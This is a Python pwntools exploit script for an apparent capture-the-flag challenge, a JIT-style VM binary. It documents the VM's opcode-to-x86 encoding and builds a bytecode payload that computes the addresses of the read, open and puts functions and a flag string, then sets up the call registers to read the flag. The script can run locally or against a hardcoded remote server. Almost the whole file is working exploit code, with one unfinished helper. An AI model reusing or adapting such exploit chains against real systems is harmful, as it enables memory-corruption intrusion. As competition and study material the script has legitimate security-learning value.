from pwn import *

def start_exploit(payload, is_remote = None):
        with open("./exploit", 'wb') as f:
                f.write(payload)

        if is_remote:
                p = remote("3.34.9.118", 5333)
                p.sendlineafter(b">>> ", payload.hex())
                print(payload.hex())
                return p

        else:
                #pause()
                p = process(["./vm", './exploit'])
                return p

with open("./vm", 'rb') as f:
        data = f.read()
        init_code = data[0x3b00:0x3b2a]
        all_opcode = data[0x3b2a:0x3f10]
        #all_opcode = [i for i in all_opcode if i not in {0}]
        #print(disasm(init_code, arch='amd64'))
        #print(disasm(what_code, arch='amd64'))
        #print(hexdump(all_opcode))

e = ELF("./vm")
# i = 0
# while True:
#       try:
#               print("============== %d ==============" % i)
#               print(disasm(all_opcode[i+1:i+4], arch='amd64'))
#               i += 4
#       except:
#               break

'''
# argc = 0 ( jmp 0 byte )
opcode 0 [ nop ]

opcode 1 [ PUSH ]
opcode 2 [ POP ]
opcode 3 [ JMP To END ]
=> argv 1 ( jmp 8byte )

# argc = 2 ( jmp 16byte )
opcode 4 [ ADD ]
-       case ( 0,1,2,3,4,5 )             -> 48 81 {?} { ARGV[1] }
-       case ( 9,10,11,12,13,14,15 ) -> 49 81 {?} { ARGV[1] }

opcode 5 [ SUB ]
-       case ( 0,1,2,3,4,5 )             -> 48 81 {?} { ARGV[1] }
-       case ( 9,10,11,12,13,14,15 ) -> 49 81 {?} { ARGV[1] }

opcode 6
-       case ( 0,1,2,3,4,5 )             -> 48 69 {?} { ARGV[1] }
-       case ( 9,10,11,12,13,14,15 ) -> 49 69 {?} { ARGV[1] }

opcode 7 [ XOR ]
-       case ( 0,1,2,3,4,5 )             -> 48 81 {?} { ARGV[1] }
-       case ( 9,10,11,12,13,14,15 ) -> 49 81 {?} { ARGV[1] }

# argc 3 ( jmp 24byte )
opcode 8 [ MOV ]
-       if ( argv_Type == 1 )
        -       case ( ARGV[1] ) ( 0 ~ 15 )     -> {?} {?} { ARGV[2] }

-       if ( argv_Type == 0 )
        -       case ( ARGV[1] ) [0 ~ 5] // 8 bytes
                -       case ( 0 ~ 5 )  -> 48 89 {?}    return
                -       case ( 9 ~ 15 ) -> 4c 89 {?}    return

        -       case ( ARGV[1] ) [9 ~ 15]
                -       case ( 0 ~ 5 )  -> 49 89 {?}    return
                -       case ( 9 ~ 15 ) -> 4d 89 {?}    return

'''


# stack
pay = b''

pay += p8(1)
pay += p64(6)

pay += p8(2)
pay += p64(7)
# rdx
pay += p8(4)
pay += p64(3)
pay += p64(0x1000)

#################### READ PIE ####################
# pop r9
pay += p8(2)
pay += p64(10)

# push r9
pay += p8(1)
pay += p64(10)

#################### CALC READ PLT ####################
# make read => sub 0x21B5
pay += p8(5)
pay += p64(10) # read
pay += p64(0x21b5)

#################### COPY READ FOR OPEN ####################
# push r9
pay += p8(1)
pay += p64(10)

# pop r10
pay += p8(2)
pay += p64(11)

# make open
pay += p8(4)
pay += p64(11) # open
pay += p64(0x80)

#################### COPY OPEN FOR PUTS ####################
# push r10
pay += p8(1)
pay += p64(11)

# pop r11
pay += p8(2)
pay += p64(12)

# make open
pay += p8(5)
pay += p64(12) # puts
pay += p64(0xe0)

#################### COPY PUTS FOR FLAG STRING ####################
# push r11
pay += p8(1)
pay += p64(12)

# pop r12
pay += p8(2)
pay += p64(13)

# make flag string
pay += p8(4)
pay += p64(13) # flag string
pay += p64(0x32c9)

#################### SET RDI, RSI, RDX FOR READ ####################

# push flag string
pay += p8(1)
pay += p64(13)

# pop rsdi
pay += p8(2)
pay += p64(5)

pay += p8(1)
pay += p64(15)
pay += p8(2)
pay += p64(4)

#
pay += p8(4)
pay += p64(6)
pay += p64(0x90)

pay += p8(2)
pay += p64(0x10)

pay += p8(1)
pay += p64(0x10)

pay += p8(4)
pay += p64(0x10)
pay += p64(0xc1f68)

pay += p8(1)
pay += p64(15)

pay += p8(2)
pay += p64(4)

pay += p8(1)
pay += p64(15)

pay += p8(2)
pay += p64(3)
#################### set CALL ####################
# add rsp
pay += p8(4)
pay += p64(6)
pay += p64(8)

pay += p8(1)
pay += p64(0x10) # open


pay += p8(2)
pay += p64(1)

# sub rsp
pay += p8(5)
pay += p64(6)
pay += p64(8)
############################################################################################

pop = 0x00000000000035FA
call = 0x00000000000035E0

def make_chain(value):
        pass


#
p = start_exploit(pay, is_remote=0)
p.interactive()

print(p.recv())
